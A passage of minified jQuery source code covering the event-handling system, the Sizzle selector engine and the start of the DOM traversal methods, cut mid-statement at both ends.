q=l[n],r=d.event.special[n]||{};if(!q){q=l[n]=[];if(!r.setup||r.setup.call(c,g,p,m)===!1)c.addEventListener?c.addEventListener(n,m,!1):c.attachEvent&&c.attachEvent("on"+n,m)}r.add&&(r.add.call(c,j),j.handler.guid||(j.handler.guid=f.guid)),q.push(j),d.event.global[n]=!0}c=null}},global:{},remove:function(a,c,e,f){if(a.nodeType!==3&&a.nodeType!==8){e===!1&&(e=x);var g,h,i,j,k=0,l,m,n,o,p,q,r,s=d.hasData(a)&&d._data(a),t=s&&s.events;if(!s||!t)return;c&&c.type&&(e=c.handler,c=c.type);if(!c||typeof c==="string"&&c.charAt(0)==="."){c=c||"";for(h in t)d.event.remove(a,h+c);return}c=c.split(" ");while(h=c[k++]){r=h,q=null,l=h.indexOf(".")<0,m=[],l||(m=h.split("."),h=m.shift(),n=new RegExp("(^|\\.)"+d.map(m.slice(0).sort(),w).join("\\.(?:.*\\.)?")+"(\\.|$)")),p=t[h];if(!p)continue;if(!e){for(j=0;j<p.length;j++){q=p[j];if(l||n.test(q.namespace))d.event.remove(a,r,q.handler,j),p.splice(j--,1)}continue}o=d.event.special[h]||{};for(j=f||0;j<p.length;j++){q=p[j];if(e.guid===q.guid){if(l||n.test(q.namespace))f==null&&p.splice(j--,1),o.remove&&o.remove.call(a,q);if(f!=null)break}}if(p.length===0||f!=null&&p.length===1)(!o.teardown||o.teardown.call(a,m)===!1)&&d.removeEvent(a,h,s.handle),g=null,delete t[h]}if(d.isEmptyObject(t)){var u=s.handle;u&&(u.elem=null),delete s.events,delete s.handle,d.isEmptyObject(s)&&d.removeData(a,b,!0)}}},trigger:function(a,c,e){var f=a.type||a,g=arguments[3];if(!g){a=typeof a==="object"?a[d.expando]?a:d.extend(d.Event(f),a):d.Event(f),f.indexOf("!")>=0&&(a.type=f=f.slice(0,-1),a.exclusive=!0),e||(a.stopPropagation(),d.event.global[f]&&d.each(d.cache,function(){var b=d.expando,e=this[b];e&&e.events&&e.events[f]&&d.event.trigger(a,c,e.handle.elem)}));if(!e||e.nodeType===3||e.nodeType===8)return b;a.result=b,a.target=e,c=d.makeArray(c),c.unshift(a)}a.currentTarget=e;var h=d._data(e,"handle");h&&h.apply(e,c);var i=e.parentNode||e.ownerDocument;try{e&&e.nodeName&&d.noData[e.nodeName.toLowerCase()]||e["on"+f]&&e["on"+f].apply(e,c)===!1&&(a.result=!1,a.preventDefault())}catch(j){}if(!a.isPropagationStopped()&&i)d.event.trigger(a,c,i,!0);else if(!a.isDefaultPrevented()){var k,l=a.target,m=f.replace(r,""),n=d.nodeName(l,"a")&&m==="click",o=d.event.special[m]||{};if((!o._default||o._default.call(e,a)===!1)&&!n&&!(l&&l.nodeName&&d.noData[l.nodeName.toLowerCase()])){try{l[m]&&(k=l["on"+m],k&&(l["on"+m]=null),d.event.triggered=a.type,l[m]())}catch(p){}k&&(l["on"+m]=k),d.event.triggered=b}}},handle:function(c){var e,f,g,h,i,j=[],k=d.makeArray(arguments);c=k[0]=d.event.fix(c||a.event),c.currentTarget=this,e=c.type.indexOf(".")<0&&!c.exclusive,e||(g=c.type.split("."),c.type=g.shift(),j=g.slice(0).sort(),h=new RegExp("(^|\\.)"+j.join("\\.(?:.*\\.)?")+"(\\.|$)")),c.namespace=c.namespace||j.join("."),i=d._data(this,"events"),f=(i||{})[c.type];if(i&&f){f=f.slice(0);for(var l=0,m=f.length;l<m;l++){var n=f[l];if(e||h.test(n.namespace)){c.handler=n.handler,c.data=n.data,c.handleObj=n;var o=n.handler.apply(this,k);o!==b&&(c.result=o,o===!1&&(c.preventDefault(),c.stopPropagation()));if(c.isImmediatePropagationStopped())break}}}return c.result},props:"altKey attrChange attrName bubbles button cancelable charCode clientX clientY ctrlKey currentTarget data detail eventPhase fromElement handler keyCode layerX layerY metaKey newValue offsetX offsetY pageX pageY prevValue relatedNode relatedTarget screenX screenY shiftKey srcElement target toElement view wheelDelta which".split(" "),fix:function(a){if(a[d.expando])return a;var e=a;a=d.Event(e);for(var f=this.props.length,g;f;)g=this.props[--f],a[g]=e[g];a.target||(a.target=a.srcElement||c),a.target.nodeType===3&&(a.target=a.target.parentNode),!a.relatedTarget&&a.fromElement&&(a.relatedTarget=a.fromElement===a.target?a.toElement:a.fromElement);if(a.pageX==null&&a.clientX!=null){var h=c.documentElement,i=c.body;a.pageX=a.clientX+(h&&h.scrollLeft||i&&i.scrollLeft||0)-(h&&h.clientLeft||i&&i.clientLeft||0),a.pageY=a.clientY+(h&&h.scrollTop||i&&i.scrollTop||0)-(h&&h.clientTop||i&&i.clientTop||0)}a.which==null&&(a.charCode!=null||a.keyCode!=null)&&(a.which=a.charCode!=null?a.charCode:a.keyCode),!a.metaKey&&a.ctrlKey&&(a.metaKey=a.ctrlKey),!a.which&&a.button!==b&&(a.which=a.button&1?1:a.button&2?3:a.button&4?2:0);return a},guid:1e8,proxy:d.proxy,special:{ready:{setup:d.bindReady,teardown:d.noop},live:{add:function(a){d.event.add(this,H(a.origType,a.selector),d.extend({},a,{handler:G,guid:a.handler.guid}))},remove:function(a){d.event.remove(this,H(a.origType,a.selector),a)}},beforeunload:{setup:function(a,b,c){d.isWindow(this)&&(this.onbeforeunload=c)},teardown:function(a,b){this.onbeforeunload===b&&(this.onbeforeunload=null)}}}},d.removeEvent=c.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)}:function(a,b,c){a.detachEvent&&a.detachEvent("on"+b,c)},d.Event=function(a){if(!this.preventDefault)return new d.Event(a);a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||a.returnValue===!1||a.getPreventDefault&&a.getPreventDefault()?y:x):this.type=a,this.timeStamp=d.now(),this[d.expando]=!0},d.Event.prototype={preventDefault:function(){this.isDefaultPrevented=y;var a=this.originalEvent;a&&(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){this.isPropagationStopped=y;var a=this.originalEvent;a&&(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=y,this.stopPropagation()},isDefaultPrevented:x,isPropagationStopped:x,isImmediatePropagationStopped:x};var z=function(a){var b=a.relatedTarget;try{if(b&&b!==c&&!b.parentNode)return;while(b&&b!==this)b=b.parentNode;b!==this&&(a.type=a.data,d.event.handle.apply(this,arguments))}catch(e){}},A=function(a){a.type=a.data,d.event.handle.apply(this,arguments)};d.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){d.event.special[a]={setup:function(c){d.event.add(this,b,c&&c.selector?A:z,a)},teardown:function(a){d.event.remove(this,b,a&&a.selector?A:z)}}}),d.support.submitBubbles||(d.event.special.submit={setup:function(a,b){if(this.nodeName&&this.nodeName.toLowerCase()!=="form")d.event.add(this,"click.specialSubmit",function(a){var b=a.target,c=b.type;(c==="submit"||c==="image")&&d(b).closest("form").length&&E("submit",this,arguments)}),d.event.add(this,"keypress.specialSubmit",function(a){var b=a.target,c=b.type;(c==="text"||c==="password")&&d(b).closest("form").length&&a.keyCode===13&&E("submit",this,arguments)});else return!1},teardown:function(a){d.event.remove(this,".specialSubmit")}});if(!d.support.changeBubbles){var B,C=function(a){var b=a.type,c=a.value;b==="radio"||b==="checkbox"?c=a.checked:b==="select-multiple"?c=a.selectedIndex>-1?d.map(a.options,function(a){return a.selected}).join("-"):"":a.nodeName.toLowerCase()==="select"&&(c=a.selectedIndex);return c},D=function D(a){var c=a.target,e,f;if(s.test(c.nodeName)&&!c.readOnly){e=d._data(c,"_change_data"),f=C(c),(a.type!=="focusout"||c.type!=="radio")&&d._data(c,"_change_data",f);if(e===b||f===e)return;if(e!=null||f)a.type="change",a.liveFired=b,d.event.trigger(a,arguments[1],c)}};d.event.special.change={filters:{focusout:D,beforedeactivate:D,click:function(a){var b=a.target,c=b.type;(c==="radio"||c==="checkbox"||b.nodeName.toLowerCase()==="select")&&D.call(this,a)},keydown:function(a){var b=a.target,c=b.type;(a.keyCode===13&&b.nodeName.toLowerCase()!=="textarea"||a.keyCode===32&&(c==="checkbox"||c==="radio")||c==="select-multiple")&&D.call(this,a)},beforeactivate:function(a){var b=a.target;d._data(b,"_change_data",C(b))}},setup:function(a,b){if(this.type==="file")return!1;for(var c in B)d.event.add(this,c+".specialChange",B[c]);return s.test(this.nodeName)},teardown:function(a){d.event.remove(this,".specialChange");return s.test(this.nodeName)}},B=d.event.special.change.filters,B.focus=B.beforeactivate}c.addEventListener&&d.each({focus:"focusin",blur:"focusout"},function(a,b){function f(a){var c=d.event.fix(a);c.type=b,c.originalEvent={},d.event.trigger(c,null,c.target),c.isDefaultPrevented()&&a.preventDefault()}var e=0;d.event.special[b]={setup:function(){e++===0&&c.addEventListener(a,f,!0)},teardown:function(){--e===0&&c.removeEventListener(a,f,!0)}}}),d.each(["bind","one"],function(a,c){d.fn[c]=function(a,e,f){if(typeof a==="object"){for(var g in a)this[c](g,e,a[g],f);return this}if(d.isFunction(e)||e===!1)f=e,e=b;var h=c==="one"?d.proxy(f,function(a){d(this).unbind(a,h);return f.apply(this,arguments)}):f;if(a==="unload"&&c!=="one")this.one(a,e,f);else for(var i=0,j=this.length;i<j;i++)d.event.add(this[i],a,h,e);return this}}),d.fn.extend({unbind:function(a,b){if(typeof a!=="object"||a.preventDefault)for(var e=0,f=this.length;e<f;e++)d.event.remove(this[e],a,b);else for(var c in a)this.unbind(c,a[c]);return this},delegate:function(a,b,c,d){return this.live(b,c,d,a)},undelegate:function(a,b,c){return arguments.length===0?this.unbind("live"):this.die(b,null,c,a)},trigger:function(a,b){return this.each(function(){d.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0]){var c=d.Event(a);c.preventDefault(),c.stopPropagation(),d.event.trigger(c,b,this[0]);return c.result}},toggle:function(a){var b=arguments,c=1;while(c<b.length)d.proxy(a,b[c++]);return this.click(d.proxy(a,function(e){var f=(d._data(this,"lastToggle"+a.guid)||0)%c;d._data(this,"lastToggle"+a.guid,f+1),e.preventDefault();return b[f].apply(this,arguments)||!1}))},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}});var F={focus:"focusin",blur:"focusout",mouseenter:"mouseover",mouseleave:"mouseout"};d.each(["live","die"],function(a,c){d.fn[c]=function(a,e,f,g){var h,i=0,j,k,l,m=g||this.selector,n=g?this:d(this.context);if(typeof a==="object"&&!a.preventDefault){for(var o in a)n[c](o,e,a[o],m);return this}d.isFunction(e)&&(f=e,e=b),a=(a||"").split(" ");while((h=a[i++])!=null){j=r.exec(h),k="",j&&(k=j[0],h=h.replace(r,""));if(h==="hover"){a.push("mouseenter"+k,"mouseleave"+k);continue}l=h,h==="focus"||h==="blur"?(a.push(F[h]+k),h=h+k):h=(F[h]||h)+k;if(c==="live")for(var p=0,q=n.length;p<q;p++)d.event.add(n[p],"live."+H(h,m),{data:e,selector:m,handler:f,origType:h,origHandler:f,preType:l});else n.unbind("live."+H(h,m),f)}return this}}),d.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error".split(" "),function(a,b){d.fn[b]=function(a,c){c==null&&(c=a,a=null);return arguments.length>0?this.bind(b,a,c):this.trigger(b)},d.attrFn&&(d.attrFn[b]=!0)}),function(){function u(a,b,c,d,e,f){for(var g=0,h=d.length;g<h;g++){var i=d[g];if(i){var j=!1;i=i[a];while(i){if(i.sizcache===c){j=d[i.sizset];break}if(i.nodeType===1){f||(i.sizcache=c,i.sizset=g);if(typeof b!=="string"){if(i===b){j=!0;break}}else if(k.filter(b,[i]).length>0){j=i;break}}i=i[a]}d[g]=j}}}function t(a,b,c,d,e,f){for(var g=0,h=d.length;g<h;g++){var i=d[g];if(i){var j=!1;i=i[a];while(i){if(i.sizcache===c){j=d[i.sizset];break}i.nodeType===1&&!f&&(i.sizcache=c,i.sizset=g);if(i.nodeName.toLowerCase()===b){j=i;break}i=i[a]}d[g]=j}}}var a=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,e=0,f=Object.prototype.toString,g=!1,h=!0,i=/\\/g,j=/\W/;[0,0].sort(function(){h=!1;return 0});var k=function(b,d,e,g){e=e||[],d=d||c;var h=d;if(d.nodeType!==1&&d.nodeType!==9)return[];if(!b||typeof b!=="string")return e;var i,j,n,o,q,r,s,t,u=!0,w=k.isXML(d),x=[],y=b;do{a.exec(""),i=a.exec(y);if(i){y=i[3],x.push(i[1]);if(i[2]){o=i[3];break}}}while(i);if(x.length>1&&m.exec(b))if(x.length===2&&l.relative[x[0]])j=v(x[0]+x[1],d);else{j=l.relative[x[0]]?[d]:k(x.shift(),d);while(x.length)b=x.shift(),l.relative[b]&&(b+=x.shift()),j=v(b,j)}else{!g&&x.length>1&&d.nodeType===9&&!w&&l.match.ID.test(x[0])&&!l.match.ID.test(x[x.length-1])&&(q=k.find(x.shift(),d,w),d=q.expr?k.filter(q.expr,q.set)[0]:q.set[0]);if(d){q=g?{expr:x.pop(),set:p(g)}:k.find(x.pop(),x.length===1&&(x[0]==="~"||x[0]==="+")&&d.parentNode?d.parentNode:d,w),j=q.expr?k.filter(q.expr,q.set):q.set,x.length>0?n=p(j):u=!1;while(x.length)r=x.pop(),s=r,l.relative[r]?s=x.pop():r="",s==null&&(s=d),l.relative[r](n,s,w)}else n=x=[]}n||(n=j),n||k.error(r||b);if(f.call(n)==="[object Array]")if(u)if(d&&d.nodeType===1)for(t=0;n[t]!=null;t++)n[t]&&(n[t]===!0||n[t].nodeType===1&&k.contains(d,n[t]))&&e.push(j[t]);else for(t=0;n[t]!=null;t++)n[t]&&n[t].nodeType===1&&e.push(j[t]);else e.push.apply(e,n);else p(n,e);o&&(k(o,h,e,g),k.uniqueSort(e));return e};k.uniqueSort=function(a){if(r){g=h,a.sort(r);if(g)for(var b=1;b<a.length;b++)a[b]===a[b-1]&&a.splice(b--,1)}return a},k.matches=function(a,b){return k(a,null,null,b)},k.matchesSelector=function(a,b){return k(b,null,null,[a]).length>0},k.find=function(a,b,c){var d;if(!a)return[];for(var e=0,f=l.order.length;e<f;e++){var g,h=l.order[e];if(g=l.leftMatch[h].exec(a)){var j=g[1];g.splice(1,1);if(j.substr(j.length-1)!=="\\"){g[1]=(g[1]||"").replace(i,""),d=l.find[h](g,b,c);if(d!=null){a=a.replace(l.match[h],"");break}}}}d||(d=typeof b.getElementsByTagName!=="undefined"?b.getElementsByTagName("*"):[]);return{set:d,expr:a}},k.filter=function(a,c,d,e){var f,g,h=a,i=[],j=c,m=c&&c[0]&&k.isXML(c[0]);while(a&&c.length){for(var n in l.filter)if((f=l.leftMatch[n].exec(a))!=null&&f[2]){var o,p,q=l.filter[n],r=f[1];g=!1,f.splice(1,1);if(r.substr(r.length-1)==="\\")continue;j===i&&(i=[]);if(l.preFilter[n]){f=l.preFilter[n](f,j,d,i,e,m);if(f){if(f===!0)continue}else g=o=!0}if(f)for(var s=0;(p=j[s])!=null;s++)if(p){o=q(p,f,s,j);var t=e^!!o;d&&o!=null?t?g=!0:j[s]=!1:t&&(i.push(p),g=!0)}if(o!==b){d||(j=i),a=a.replace(l.match[n],"");if(!g)return[];break}}if(a===h)if(g==null)k.error(a);else break;h=a}return j},k.error=function(a){throw"Syntax error, unrecognized expression: "+a};var l=k.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(?:(['"])(.*?)\3|(#?(?:[\w\u00c0-\uFFFF\-]|\\.)*)|)|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(a){return a.getAttribute("href")},type:function(a){return a.getAttribute("type")}},relative:{"+":function(a,b){var c=typeof b==="string",d=c&&!j.test(b),e=c&&!d;d&&(b=b.toLowerCase());for(var f=0,g=a.length,h;f<g;f++)if(h=a[f]){while((h=h.previousSibling)&&h.nodeType!==1){}a[f]=e||h&&h.nodeName.toLowerCase()===b?h||!1:h===b}e&&k.filter(b,a,!0)},">":function(a,b){var c,d=typeof b==="string",e=0,f=a.length;if(d&&!j.test(b)){b=b.toLowerCase();for(;e<f;e++){c=a[e];if(c){var g=c.parentNode;a[e]=g.nodeName.toLowerCase()===b?g:!1}}}else{for(;e<f;e++)c=a[e],c&&(a[e]=d?c.parentNode:c.parentNode===b);d&&k.filter(b,a,!0)}},"":function(a,b,c){var d,f=e++,g=u;typeof b==="string"&&!j.test(b)&&(b=b.toLowerCase(),d=b,g=t),g("parentNode",b,f,a,d,c)},"~":function(a,b,c){var d,f=e++,g=u;typeof b==="string"&&!j.test(b)&&(b=b.toLowerCase(),d=b,g=t),g("previousSibling",b,f,a,d,c)}},find:{ID:function(a,b,c){if(typeof b.getElementById!=="undefined"&&!c){var d=b.getElementById(a[1]);return d&&d.parentNode?[d]:[]}},NAME:function(a,b){if(typeof b.getElementsByName!=="undefined"){var c=[],d=b.getElementsByName(a[1]);for(var e=0,f=d.length;e<f;e++)d[e].getAttribute("name")===a[1]&&c.push(d[e]);return c.length===0?null:c}},TAG:function(a,b){if(typeof b.getElementsByTagName!=="undefined")return b.getElementsByTagName(a[1])}},preFilter:{CLASS:function(a,b,c,d,e,f){a=" "+a[1].replace(i,"")+" ";if(f)return a;for(var g=0,h;(h=b[g])!=null;g++)h&&(e^(h.className&&(" "+h.className+" ").replace(/[\t\n\r]/g," ").indexOf(a)>=0)?c||d.push(h):c&&(b[g]=!1));return!1},ID:function(a){return a[1].replace(i,"")},TAG:function(a,b){return a[1].replace(i,"").toLowerCase()},CHILD:function(a){if(a[1]==="nth"){a[2]||k.error(a[0]),a[2]=a[2].replace(/^\+|\s*/g,"");var b=/(-?)(\d*)(?:n([+\-]?\d*))?/.exec(a[2]==="even"&&"2n"||a[2]==="odd"&&"2n+1"||!/\D/.test(a[2])&&"0n+"+a[2]||a[2]);a[2]=b[1]+(b[2]||1)-0,a[3]=b[3]-0}else a[2]&&k.error(a[0]);a[0]=e++;return a},ATTR:function(a,b,c,d,e,f){var g=a[1]=a[1].replace(i,"");!f&&l.attrMap[g]&&(a[1]=l.attrMap[g]),a[4]=(a[4]||a[5]||"").replace(i,""),a[2]==="~="&&(a[4]=" "+a[4]+" ");return a},PSEUDO:function(b,c,d,e,f){if(b[1]==="not")if((a.exec(b[3])||"").length>1||/^\w/.test(b[3]))b[3]=k(b[3],null,null,c);else{var g=k.filter(b[3],c,d,!0^f);d||e.push.apply(e,g);return!1}else if(l.match.POS.test(b[0])||l.match.CHILD.test(b[0]))return!0;return b},POS:function(a){a.unshift(!0);return a}},filters:{enabled:function(a){return a.disabled===!1&&a.type!=="hidden"},disabled:function(a){return a.disabled===!0},checked:function(a){return a.checked===!0},selected:function(a){a.parentNode&&a.parentNode.selectedIndex;return a.selected===!0},parent:function(a){return!!a.firstChild},empty:function(a){return!a.firstChild},has:function(a,b,c){return!!k(c[3],a).length},header:function(a){return/h\d/i.test(a.nodeName)},text:function(a){var b=a.getAttribute("type"),c=a.type;return"text"===c&&(b===c||b===null)},radio:function(a){return"radio"===a.type},checkbox:function(a){return"checkbox"===a.type},file:function(a){return"file"===a.type},password:function(a){return"password"===a.type},submit:function(a){return"submit"===a.type},image:function(a){return"image"===a.type},reset:function(a){return"reset"===a.type},button:function(a){return"button"===a.type||a.nodeName.toLowerCase()==="button"},input:function(a){return/input|select|textarea|button/i.test(a.nodeName)}},setFilters:{first:function(a,b){return b===0},last:function(a,b,c,d){return b===d.length-1},even:function(a,b){return b%2===0},odd:function(a,b){return b%2===1},lt:function(a,b,c){return b<c[3]-0},gt:function(a,b,c){return b>c[3]-0},nth:function(a,b,c){return c[3]-0===b},eq:function(a,b,c){return c[3]-0===b}},filter:{PSEUDO:function(a,b,c,d){var e=b[1],f=l.filters[e];if(f)return f(a,c,b,d);if(e==="contains")return(a.textContent||a.innerText||k.getText([a])||"").indexOf(b[3])>=0;if(e==="not"){var g=b[3];for(var h=0,i=g.length;h<i;h++)if(g[h]===a)return!1;return!0}k.error(e)},CHILD:function(a,b){var c=b[1],d=a;switch(c){case"only":case"first":while(d=d.previousSibling)if(d.nodeType===1)return!1;if(c==="first")return!0;d=a;case"last":while(d=d.nextSibling)if(d.nodeType===1)return!1;return!0;case"nth":var e=b[2],f=b[3];if(e===1&&f===0)return!0;var g=b[0],h=a.parentNode;if(h&&(h.sizcache!==g||!a.nodeIndex)){var i=0;for(d=h.firstChild;d;d=d.nextSibling)d.nodeType===1&&(d.nodeIndex=++i);h.sizcache=g}var j=a.nodeIndex-f;return e===0?j===0:j%e===0&&j/e>=0}},ID:function(a,b){return a.nodeType===1&&a.getAttribute("id")===b},TAG:function(a,b){return b==="*"&&a.nodeType===1||a.nodeName.toLowerCase()===b},CLASS:function(a,b){return(" "+(a.className||a.getAttribute("class"))+" ").indexOf(b)>-1},ATTR:function(a,b){var c=b[1],d=l.attrHandle[c]?l.attrHandle[c](a):a[c]!=null?a[c]:a.getAttribute(c),e=d+"",f=b[2],g=b[4];return d==null?f==="!=":f==="="?e===g:f==="*="?e.indexOf(g)>=0:f==="~="?(" "+e+" ").indexOf(g)>=0:g?f==="!="?e!==g:f==="^="?e.indexOf(g)===0:f==="$="?e.substr(e.length-g.length)===g:f==="|="?e===g||e.substr(0,g.length+1)===g+"-":!1:e&&d!==!1},POS:function(a,b,c,d){var e=b[2],f=l.setFilters[e];if(f)return f(a,c,b,d)}}},m=l.match.POS,n=function(a,b){return"\\"+(b-0+1)};for(var o in l.match)l.match[o]=new RegExp(l.match[o].source+/(?![^\[]*\])(?![^\(]*\))/.source),l.leftMatch[o]=new RegExp(/(^(?:.|\r|\n)*?)/.source+l.match[o].source.replace(/\\(\d+)/g,n));var p=function(a,b){a=Array.prototype.slice.call(a,0);if(b){b.push.apply(b,a);return b}return a};try{Array.prototype.slice.call(c.documentElement.childNodes,0)[0].nodeType}catch(q){p=function(a,b){var c=0,d=b||[];if(f.call(a)==="[object Array]")Array.prototype.push.apply(d,a);else if(typeof a.length==="number")for(var e=a.length;c<e;c++)d.push(a[c]);else for(;a[c];c++)d.push(a[c]);return d}}var r,s;c.documentElement.compareDocumentPosition?r=function(a,b){if(a===b){g=!0;return 0}if(!a.compareDocumentPosition||!b.compareDocumentPosition)return a.compareDocumentPosition?-1:1;return a.compareDocumentPosition(b)&4?-1:1}:(r=function(a,b){var c,d,e=[],f=[],h=a.parentNode,i=b.parentNode,j=h;if(a===b){g=!0;return 0}if(h===i)return s(a,b);if(!h)return-1;if(!i)return 1;while(j)e.unshift(j),j=j.parentNode;j=i;while(j)f.unshift(j),j=j.parentNode;c=e.length,d=f.length;for(var k=0;k<c&&k<d;k++)if(e[k]!==f[k])return s(e[k],f[k]);return k===c?s(a,f[k],-1):s(e[k],b,1)},s=function(a,b,c){if(a===b)return c;var d=a.nextSibling;while(d){if(d===b)return-1;d=d.nextSibling}return 1}),k.getText=function(a){var b="",c;for(var d=0;a[d];d++)c=a[d],c.nodeType===3||c.nodeType===4?b+=c.nodeValue:c.nodeType!==8&&(b+=k.getText(c.childNodes));return b},function(){var a=c.createElement("div"),d="script"+(new Date).getTime(),e=c.documentElement;a.innerHTML="<a name='"+d+"'/>",e.insertBefore(a,e.firstChild),c.getElementById(d)&&(l.find.ID=function(a,c,d){if(typeof c.getElementById!=="undefined"&&!d){var e=c.getElementById(a[1]);return e?e.id===a[1]||typeof e.getAttributeNode!=="undefined"&&e.getAttributeNode("id").nodeValue===a[1]?[e]:b:[]}},l.filter.ID=function(a,b){var c=typeof a.getAttributeNode!=="undefined"&&a.getAttributeNode("id");return a.nodeType===1&&c&&c.nodeValue===b}),e.removeChild(a),e=a=null}(),function(){var a=c.createElement("div");a.appendChild(c.createComment("")),a.getElementsByTagName("*").length>0&&(l.find.TAG=function(a,b){var c=b.getElementsByTagName(a[1]);if(a[1]==="*"){var d=[];for(var e=0;c[e];e++)c[e].nodeType===1&&d.push(c[e]);c=d}return c}),a.innerHTML="<a href='#'></a>",a.firstChild&&typeof a.firstChild.getAttribute!=="undefined"&&a.firstChild.getAttribute("href")!=="#"&&(l.attrHandle.href=function(a){return a.getAttribute("href",2)}),a=null}(),c.querySelectorAll&&function(){var a=k,b=c.createElement("div"),d="__sizzle__";b.innerHTML="<p class='TEST'></p>";if(!b.querySelectorAll||b.querySelectorAll(".TEST").length!==0){k=function(b,e,f,g){e=e||c;if(!g&&!k.isXML(e)){var h=/^(\w+$)|^\.([\w\-]+$)|^#([\w\-]+$)/.exec(b);if(h&&(e.nodeType===1||e.nodeType===9)){if(h[1])return p(e.getElementsByTagName(b),f);if(h[2]&&l.find.CLASS&&e.getElementsByClassName)return p(e.getElementsByClassName(h[2]),f)}if(e.nodeType===9){if(b==="body"&&e.body)return p([e.body],f);if(h&&h[3]){var i=e.getElementById(h[3]);if(!i||!i.parentNode)return p([],f);if(i.id===h[3])return p([i],f)}try{return p(e.querySelectorAll(b),f)}catch(j){}}else if(e.nodeType===1&&e.nodeName.toLowerCase()!=="object"){var m=e,n=e.getAttribute("id"),o=n||d,q=e.parentNode,r=/^\s*[+~]/.test(b);n?o=o.replace(/'/g,"\\$&"):e.setAttribute("id",o),r&&q&&(e=e.parentNode);try{if(!r||q)return p(e.querySelectorAll("[id='"+o+"'] "+b),f)}catch(s){}finally{n||m.removeAttribute("id")}}}return a(b,e,f,g)};for(var e in a)k[e]=a[e];b=null}}(),function(){var a=c.documentElement,b=a.matchesSelector||a.mozMatchesSelector||a.webkitMatchesSelector||a.msMatchesSelector;if(b){var d=!b.call(c.createElement("div"),"div"),e=!1;try{b.call(c.documentElement,"[test!='']:sizzle")}catch(f){e=!0}k.matchesSelector=function(a,c){c=c.replace(/\=\s*([^'"\]]*)\s*\]/g,"='$1']");if(!k.isXML(a))try{if(e||!l.match.PSEUDO.test(c)&&!/!=/.test(c)){var f=b.call(a,c);if(f||!d||a.document&&a.document.nodeType!==11)return f}}catch(g){}return k(c,null,null,[a]).length>0}}}(),function(){var a=c.createElement("div");a.innerHTML="<div class='test e'></div><div class='test'></div>";if(a.getElementsByClassName&&a.getElementsByClassName("e").length!==0){a.lastChild.className="e";if(a.getElementsByClassName("e").length===1)return;l.order.splice(1,0,"CLASS"),l.find.CLASS=function(a,b,c){if(typeof b.getElementsByClassName!=="undefined"&&!c)return b.getElementsByClassName(a[1])},a=null}}(),c.documentElement.contains?k.contains=function(a,b){return a!==b&&(a.contains?a.contains(b):!0)}:c.documentElement.compareDocumentPosition?k.contains=function(a,b){return!!(a.compareDocumentPosition(b)&16)}:k.contains=function(){return!1},k.isXML=function(a){var b=(a?a.ownerDocument||a:0).documentElement;return b?b.nodeName!=="HTML":!1};var v=function(a,b){var c,d=[],e="",f=b.nodeType?[b]:b;while(c=l.match.PSEUDO.exec(a))e+=c[0],a=a.replace(l.match.PSEUDO,"");a=l.relative[a]?a+"*":a;for(var g=0,h=f.length;g<h;g++)k(a,f[g],d);return k.filter(e,d)};d.find=k,d.expr=k.selectors,d.expr[":"]=d.expr.filters,d.unique=k.uniqueSort,d.text=k.getText,d.isXMLDoc=k.isXML,d.contains=k.contains}();var I=/Until$/,J=/^(?:parents|prevUntil|prevAll)/,K=/,/,L=/^.[^:#\[\.,]*$/,M=Array.prototype.slice,N=d.expr.match.POS,O={children:!0,contents:!0,next:!0,prev:!0};d.fn.extend({find:function(a){var b=this.pushStack("","find",a),c=0;for(var e=0,f=this.length;e<f;e++){c=b.length,d.find(a,this[e],b);if(e>0)for(var g=c;g<b.length;g++)for(var h=0;h<c;h++)if(b[h]===b[g]){b.splice(g--,1);break}}return b},has:function(a){var b=d(a);return this.filter(function(){for(var a=0,c=b.length;a<c;a++)if(d.contains(this,b[a]))return!0})},not:function(a){return this.pushStack(Q(this,a,!1),"not",a)},filter:function(a){return this.pushStack(Q(this,a,!0),"filter",a)},is:function(a){return!!a&&d.filter(a,this).length>0},closest:function(a,b){var c=[],e,f,g=this[0];if(d.isArray(a)){var h,i,j={},k=1;if(g&&a.length){for(e=0,f=a.length;e<f;e++)i=a[e],j[i]||(j[i]=d.expr.match.POS.test(i)?d(i,b||this.context):i);while(g&&g.ownerDocument&&g!==b){for(i in j)h=j[i],(h.jquery?h.index(g)>-1:d(g).is(h))&&c.push({selector:i,elem:g,level:k});g=g.parentNode,k++}}return c}var l=N.test(a)?d(a,b||this.context):null;for(e=0,f=this.length;e<f;e++){g=this[e];while(g){if(l?l.index(g)>-1:d.find.matchesSelector(g,a)){c.push(g);break}g=g.parentNode;if(!g||!g.ownerDocument||g===b)break}}c=c.length>1?d.unique(c):c;return this.pushStack(c,"closest",a)},index:function(a){if(!a||typeof a==="string")return d.inArray(this[0],a?d(a):this.parent().children());return d.inArray(a.jquery?a[0]:a,this)},add:function(a,b){var c=typeof 